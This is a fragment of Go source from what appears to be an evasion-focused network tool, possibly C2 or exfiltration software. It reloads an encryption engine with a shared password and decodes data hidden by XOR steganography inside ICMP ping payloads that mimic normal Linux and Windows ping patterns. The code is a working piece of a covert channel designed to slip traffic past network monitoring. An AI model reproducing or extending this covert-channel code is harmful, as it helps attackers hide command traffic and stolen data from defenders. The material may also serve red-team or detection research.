	// Update crypto engine configuration
	cryptoConfig := crypto.CryptoConfig{
		Enabled:          o.config.Evasion.CryptoAgility.Enabled,
		Algorithms:       o.config.Evasion.CryptoAgility.Algorithms,
		RotationInterval: time.Duration(o.config.Evasion.CryptoAgility.RotationInterval) * time.Second,
		DefaultAlgorithm: o.config.Evasion.CryptoAgility.DefaultAlgorithm,
		SharedPassword:   password,
	}

	// Recreate crypto engine with password
	newCryptoEngine, err := crypto.NewCryptoEngine(cryptoConfig)
	if err != nil {
		return fmt.Errorf("failed to recreate crypto engine with password: %w", err)
	}

	// Close old engine and replace
	o.cryptoEngine.Close()
	o.cryptoEngine = newCryptoEngine

	o.logger.Info("Crypto engine updated with shared password")
	return nil
}

// extractStealthData extracts hidden data from ICMP ping payload
// This reverses the steganography process used in network.createLinuxPingPayload and createWindowsPingPayload
func (o *Orchestrator) extractStealthData(payload []byte) ([]byte, error) {
	if len(payload) < 8 {
		return nil, fmt.Errorf("payload too short for ping pattern")
	}

	// Skip timestamp (first 8 bytes) and extract the pattern data
	patternData := payload[8:]

	if len(patternData) == 0 {
		return nil, fmt.Errorf("no pattern data available")
	}

	// Try Linux ping pattern first (most common)
	if len(payload) == 56 { // Linux ping payload size
		return o.extractLinuxPattern(patternData)
	} else if len(payload) == 32 { // Windows ping payload size
		return o.extractWindowsPattern(patternData)
	} else {
		// Unknown pattern, try both methods
		if data, err := o.extractLinuxPattern(patternData); err == nil && len(data) > 0 {
			return data, nil
		}
		return o.extractWindowsPattern(patternData)
	}
}

// extractLinuxPattern extracts data from Linux ping pattern (0x08, 0x09, 0x0a, ...)
func (o *Orchestrator) extractLinuxPattern(patternData []byte) ([]byte, error) {
	extracted := make([]byte, 0, len(patternData))

	for i, b := range patternData {
		expectedPattern := byte(8 + i) // Linux pattern: 0x08, 0x09, 0x0a...
		if expectedPattern > 0x37 {
			break // End of valid pattern range
		}

		// XOR to extract hidden data
		hiddenByte := b ^ expectedPattern

		// If the result is 0, it might be padding or end of data
		if hiddenByte == 0 && i > 0 {
			break
		}

		extracted = append(extracted, hiddenByte)
	}

	// Remove trailing zeros (padding)
	for len(extracted) > 0 && extracted[len(extracted)-1] == 0 {
		extracted = extracted[:len(extracted)-1]
	}

	return extracted, nil
}

// extractWindowsPattern extracts data from Windows ping alphabet pattern
func (o *Orchestrator) extractWindowsPattern(patternData []byte) ([]byte, error) {
	alphabet := "abcdefghijklmnopqrstuvwabcdefghi"
	extracted := make([]byte, 0, len(patternData))

	// Skip first 8 bytes to match the embedding offset used in createWindowsPingPayload
	startOffset := 0
	if len(patternData) >= 8 {
		startOffset = 8
	}

	for i := startOffset; i < len(patternData) && i < len(alphabet); i++ {
		expectedChar := byte(alphabet[i])
		actualByte := patternData[i]

		// Reverse the double XOR: result = actual ^ expected ^ position
		hiddenByte := actualByte ^ expectedChar ^ byte(i+97)

		// If the result is 0, it might be padding or end of data
		if hiddenByte == 0 && len(extracted) > 0 {
			break
		}

		extracted = append(extracted, hiddenByte)
	}

	// Remove trailing zeros (padding)
	for len(extracted) > 0 && extracted[len(extracted)-1] == 0 {
		extracted = extracted[:len(extracted)-1]
	}

	return extracted, nil
}